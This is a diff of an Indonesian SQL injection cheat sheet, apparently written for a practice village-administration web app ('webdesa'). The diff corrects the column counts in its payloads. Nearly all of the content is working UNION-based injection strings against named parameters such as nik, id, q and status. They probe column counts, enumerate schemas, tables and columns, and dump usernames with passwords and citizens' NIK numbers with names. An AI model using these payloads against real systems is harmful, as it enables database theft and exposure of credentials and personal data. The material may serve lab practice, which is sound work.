@@ -37,57 +37,56 @@ Password: [kosong]
 
 ### Cek Jumlah Kolom (ORDER BY)
 ```
-nik: ' ORDER BY 1-- -
-nik: ' ORDER BY 2-- -
-...
-nik: ' ORDER BY 12-- -
+nik: ' ORDER BY 1-- -     (OK)
+nik: ' ORDER BY 13-- -    (OK)
+nik: ' ORDER BY 14-- -    (ERROR)
 ```
-Naikkan angka sampai error. Jika error di ORDER BY 13, maka ada 12 kolom.
+Jika error di ORDER BY 14, maka warga = 13 kolom.
 
 ### UNION SELECT - Cek Kolom yang Tampil
 ```
-nik: ' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -
+nik: ' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -
 ```
-Perhatikan angka mana yang muncul di halaman.
+Kolom 3 (nama) biasanya yang tampil di halaman.
 
 ### Ekstrak Versi MySQL
 ```
-nik: ' UNION SELECT 1,version(),3,4,5,6,7,8,9,10,11,12-- -
+nik: ' UNION SELECT 1,2,version(),4,5,6,7,8,9,10,11,12,13-- -
 ```
 
 ### Ekstrak Database User
 ```
-nik: ' UNION SELECT 1,user(),3,4,5,6,7,8,9,10,11,12-- -
+nik: ' UNION SELECT 1,2,user(),4,5,6,7,8,9,10,11,12,13-- -
 ```
 
 ### Ekstrak Nama Database
 ```
-nik: ' UNION SELECT 1,database(),3,4,5,6,7,8,9,10,11,12-- -
+nik: ' UNION SELECT 1,2,database(),4,5,6,7,8,9,10,11,12,13-- -
 ```
 
 ### Ekstrak Semua Nama Database
 ```
-nik: ' UNION SELECT 1,GROUP_CONCAT(schema_name),3,4,5,6,7,8,9,10,11,12 FROM information_schema.schemata-- -
+nik: ' UNION SELECT 1,2,GROUP_CONCAT(schema_name),4,5,6,7,8,9,10,11,12,13 FROM information_schema.schemata-- -
 ```
 
 ### Ekstrak Semua Nama Tabel
 ```
-nik: ' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7,8,9,10,11,12 FROM information_schema.tables WHERE table_schema='webdesa'-- -
+nik: ' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6,7,8,9,10,11,12,13 FROM information_schema.tables WHERE table_schema=database()-- -
 ```
 
 ### Ekstrak Kolom dari Tabel Users
 ```
-nik: ' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7,8,9,10,11,12 FROM information_schema.columns WHERE table_name='users'-- -
+nik: ' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6,7,8,9,10,11,12,13 FROM information_schema.columns WHERE table_name='users'-- -
 ```
 
 ### Dump Data Users (Username & Password)
 ```
-nik: ' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3,4,5,6,7,8,9,10,11,12 FROM users-- -
+nik: ' UNION SELECT 1,2,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),4,5,6,7,8,9,10,11,12,13 FROM users-- -
 ```
 
 ### Dump Data Warga (NIK & Nama)
 ```
-nik: ' UNION SELECT 1,GROUP_CONCAT(nik,0x3a,nama SEPARATOR 0x0a),3,4,5,6,7,8,9,10,11,12 FROM warga-- -
+nik: ' UNION SELECT 1,2,GROUP_CONCAT(nik,0x3a,nama SEPARATOR 0x0a),4,5,6,7,8,9,10,11,12,13 FROM warga-- -
 ```
 
 ---
@@ -159,9 +158,9 @@ nik: ' AND IF(SUBSTRING((SELECT database()),1,1)='w',SLEEP(5),0)-- -
 
 ## 6. GET Parameter Injection (berita_detail.php)
 
-### UNION-based
+### UNION-based (berita = 6 columns)
 ```
-?id=-1 UNION SELECT 1,2,3,4,5-- -
+?id=-1 UNION SELECT 1,2,3,4,5,6-- -
 ```
 
 ### Error-based
@@ -184,9 +183,9 @@ nik: ' AND IF(SUBSTRING((SELECT database()),1,1)='w',SLEEP(5),0)-- -
 
 ## 7. Search Injection (admin/warga.php?q=)
 
-### UNION-based
+### UNION-based (warga = 13 columns)
 ```
-?q=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -
+?q=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -
 ```
 
 ### Error-based
@@ -196,16 +195,16 @@ nik: ' AND IF(SUBSTRING((SELECT database()),1,1)='w',SLEEP(5),0)-- -
 
 ### Wildcard Bypass
 ```
-?q=%' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -
+?q=%' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -
 ```
 
 ---
 
 ## 8. Filter Bypass (admin/surat.php?status=)
 
-### UNION-based
+### UNION-based (JOIN = 15 columns)
 ```
-?status=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- -
+?status=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- -
 ```
 
 ### Error-based
@@ -245,7 +244,7 @@ nik: ' AND IF(SUBSTRING((SELECT database()),1,1)='w',SLEEP(5),0)-- -
 
 ### Double Query
 ```
-' UNION SELECT 1,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users),3,4,5,6,7,8,9,10,11,12-- -
+' UNION SELECT 1,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users),3,4,5,6,7,8,9,10,11,12,13-- -
 ```
 
 ---
@@ -254,36 +253,36 @@ nik: ' AND IF(SUBSTRING((SELECT database()),1,1)='w',SLEEP(5),0)-- -
 
 ### Step 1: Identifikasi Jumlah Kolom
 ```
-nik: ' ORDER BY 1-- -  (OK)
-nik: ' ORDER BY 12-- - (OK)
-nik: ' ORDER BY 13-- - (ERROR)
+nik: ' ORDER BY 1-- -   (OK)
+nik: ' ORDER BY 13-- -  (OK)
+nik: ' ORDER BY 14-- -  (ERROR)
 ```
-Result: 12 kolom
+Result: 13 kolom (warga table)
 
 ### Step 2: Identifikasi Kolom yang Tampil
 ```
-nik: ' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -
+nik: ' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -
 ```
-Misal kolom 2 dan 5 yang tampil.
+Kolom 3 (nama) biasanya yang tampil.
 
 ### Step 3: Ekstrak Info Database
 ```
-nik: ' UNION SELECT 1,version(),3,4,database(),6,7,8,9,10,11,12-- -
+nik: ' UNION SELECT 1,2,version(),4,5,6,database(),8,9,10,11,12,13-- -
 ```
 
 ### Step 4: Enumerasi Tabel
 ```
-nik: ' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7,8,9,10,11,12 FROM information_schema.tables WHERE table_schema=database()-- -
+nik: ' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6,7,8,9,10,11,12,13 FROM information_schema.tables WHERE table_schema=database()-- -
 ```
 
 ### Step 5: Enumerasi Kolom
 ```
-nik: ' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7,8,9,10,11,12 FROM information_schema.columns WHERE table_name='users'-- -
+nik: ' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6,7,8,9,10,11,12,13 FROM information_schema.columns WHERE table_name='users'-- -
 ```
 
 ### Step 6: Dump Data
 ```
-nik: ' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3,4,5,6,7,8,9,10,11,12 FROM users-- -
+nik: ' UNION SELECT 1,2,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),4,5,6,7,8,9,10,11,12,13 FROM users-- -
 ```
 
 ---
